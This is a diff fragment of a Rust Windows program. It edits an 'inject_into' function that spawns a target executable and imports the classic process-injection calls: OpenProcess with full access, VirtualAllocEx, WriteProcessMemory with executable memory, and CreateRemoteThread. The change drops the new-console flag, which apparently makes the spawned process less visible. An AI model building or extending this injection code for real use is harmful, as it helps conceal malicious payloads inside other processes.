@@ -2,6 +2,7 @@ use shared::pe;
 
 use std::ffi::c_void;
 use std::mem::size_of;
+use std::process::Stdio;
 use std::{process::Command, ptr};
 use std::os::windows::process::CommandExt;
 
@@ -13,18 +14,18 @@ use windows::Win32::Foundation::{HANDLE, HINSTANCE, CloseHandle, GetLastError};
 use windows::Win32::System::Diagnostics::Debug::{WriteProcessMemory, ReadProcessMemory};
 use windows::Win32::System::LibraryLoader::{DONT_RESOLVE_DLL_REFERENCES, LoadLibraryExA, GetProcAddress};
 use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_FREE, VirtualFree};
-use windows::Win32::System::Threading::{CREATE_NEW_CONSOLE, CreateRemoteThread, WaitForSingleObject};
+use windows::Win32::System::Threading::{CREATE_NEW_CONSOLE, CreateRemoteThread, WaitForSingleObject, DETACHED_PROCESS};
 use windows::Win32::System::{
     Threading::{OpenProcess, PROCESS_ALL_ACCESS}, 
     Memory::VirtualAllocEx
 };
 
 pub unsafe fn inject_into(exec_path: &str) -> Result<()> {
+
     info!("Preparing to inject payload into executable at '{}'", exec_path);
 
     // Spawn the process in a suspended state.
     let proc = Command::new(exec_path)
-        .creation_flags(CREATE_NEW_CONSOLE)
         .spawn()?;
 
     let proc_handle = OpenProcess(
